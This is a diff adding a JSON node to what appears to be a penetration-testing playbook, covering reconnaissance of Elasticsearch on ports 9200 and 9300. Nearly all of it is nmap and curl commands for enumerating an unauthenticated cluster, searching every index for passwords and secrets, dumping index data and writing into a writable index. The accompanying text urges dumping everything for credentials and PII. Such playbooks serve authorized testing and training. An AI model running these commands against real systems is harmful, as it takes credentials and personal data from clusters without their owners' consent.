@@ -1,0 +1,22 @@
+{
+  "id": "elasticsearch",
+  "phase": "RECON",
+  "title": "Elasticsearch (9200/9300)",
+  "body": "Elasticsearch REST API is unauthenticated by default in older versions. All data is JSON and browsable. Dump everything — it often holds app credentials and PII.",
+  "cmd": "nmap -p 9200,9300 -sV $ip\ncurl -s http://$ip:9200/          # cluster info + version\ncurl -s http://$ip:9200/_cat/indices?v  # list all indices\ncurl -s http://$ip:9200/_cat/nodes?v    # node info\n\n# Browse indices\ncurl -s http://$ip:9200/<index>/_search?pretty\ncurl -s http://$ip:9200/<index>/_search?q=password&pretty\ncurl -s \"http://$ip:9200/_all/_search?q=password&pretty&size=100\"\n\n# Dump all data\ncurl -s http://$ip:9200/<index>/_search?size=10000 | jq .\n\n# Cluster settings\ncurl -s http://$ip:9200/_cluster/settings\ncurl -s http://$ip:9200/_nodes\n\n# Search for credentials\ncurl -s \"http://$ip:9200/_all/_search?q=password+OR+passwd+OR+secret&pretty\"\n\n# Write to index (if writable — can inject data)\ncurl -X POST http://$ip:9200/test/_doc/1 \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"cmd\":\"id\"}'\n\n# Check for Kibana on 5601\ncurl -s http://$ip:5601/api/status",
+  "warn": "Elasticsearch 8.x has security enabled by default. Older versions (6.x, 7.x) are often unauthenticated.",
+  "choices": [
+    {
+      "label": "Found credentials in indices",
+      "next": "creds_found"
+    },
+    {
+      "label": "Kibana accessible on 5601",
+      "next": "web_enum"
+    },
+    {
+      "label": "Nothing useful — check other ports",
+      "next": "unknown_service"
+    }
+  ]
+}
